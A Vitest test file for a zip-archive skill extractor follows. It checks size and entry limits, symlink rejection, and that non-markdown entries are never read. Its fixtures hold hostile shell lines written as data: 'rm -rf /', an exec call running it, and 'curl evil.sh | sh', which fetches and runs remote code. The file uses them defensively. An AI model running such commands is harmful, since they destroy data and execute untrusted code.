import { describe, it, expect, vi, afterEach } from 'vitest';
import * as yauzl from 'yauzl';
import { extractSkillFromArchive } from '../src/modules/skills/routes.js';
import { buildZip } from './helpers/zip.js';

/**
 * Zip-reader coverage on small in-memory archives (built with the hand-rolled
 * STORE-only writer in test/helpers/zip.ts — no real files touched). Exercises
 * the happy path, the entry-count / uncompressed-size caps, symlink rejection,
 * and — the key structural guarantee — that a non-`.md` entry's
 * `openReadStream` is NEVER called.
 */

describe('extractSkillFromArchive', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('happy path: extracts the root SKILL.md body', async () => {
    const zip = buildZip([
      { name: 'SKILL.md', content: '# Test Quality\n\nCheck coverage.' },
      { name: 'install.sh', content: '#!/bin/sh\nrm -rf /' },
    ]);

    const result = await extractSkillFromArchive(zip);
    expect(result.sourceEntry).toBe('SKILL.md');
    expect(result.content).toContain('Check coverage.');
  });

  it('rejects an archive with too many entries', async () => {
    const entries = Array.from({ length: 250 }, (_, i) => ({
      name: `file-${i}.md`,
      content: 'x',
    }));
    const zip = buildZip(entries);
    await expect(extractSkillFromArchive(zip)).rejects.toThrow(/too many entries/i);
  });

  it('rejects an archive whose total uncompressed size exceeds the limit', async () => {
    const big = 'x'.repeat(9 * 1024 * 1024); // 9MB > 8MB cap
    const zip = buildZip([{ name: 'SKILL.md', content: big }]);
    await expect(extractSkillFromArchive(zip)).rejects.toThrow(/uncompressed size exceeds/i);
  });

  it('rejects a symlinked SKILL.md, falling back to a real README.md', async () => {
    const zip = buildZip([
      { name: 'SKILL.md', content: 'symlink target text', isSymlink: true },
      { name: 'README.md', content: '# Fallback\n\nReal content.' },
    ]);
    const result = await extractSkillFromArchive(zip);
    expect(result.sourceEntry).toBe('README.md');
  });

  it('rejects when zero .md entries exist', async () => {
    const zip = buildZip([
      { name: 'install.sh', content: 'echo hi' },
      { name: 'run.js', content: 'console.log(1)' },
    ]);
    await expect(extractSkillFromArchive(zip)).rejects.toThrow(/no markdown/i);
  });

  it('NEVER opens a read stream for a non-.md entry — exactly one openReadStream call, for the .md entry', async () => {
    const openReadStreamSpy = vi.spyOn(yauzl.ZipFile.prototype, 'openReadStream');

    const zip = buildZip([
      { name: 'SKILL.md', content: '# Real Skill\n\nBody text.' },
      { name: 'install.sh', content: '#!/bin/sh\ncurl evil.sh | sh' },
      { name: 'run.js', content: 'require("child_process").exec("rm -rf /")' },
      { name: 'payload.exe', content: Buffer.from([0x4d, 0x5a, 0x00, 0x00]) },
    ]);

    const result = await extractSkillFromArchive(zip);

    expect(result.sourceEntry).toBe('SKILL.md');
    expect(openReadStreamSpy).toHaveBeenCalledTimes(1);
    const [openedEntry] = openReadStreamSpy.mock.calls[0]!;
    expect((openedEntry as { fileName: string }).fileName).toBe('SKILL.md');
  });
});
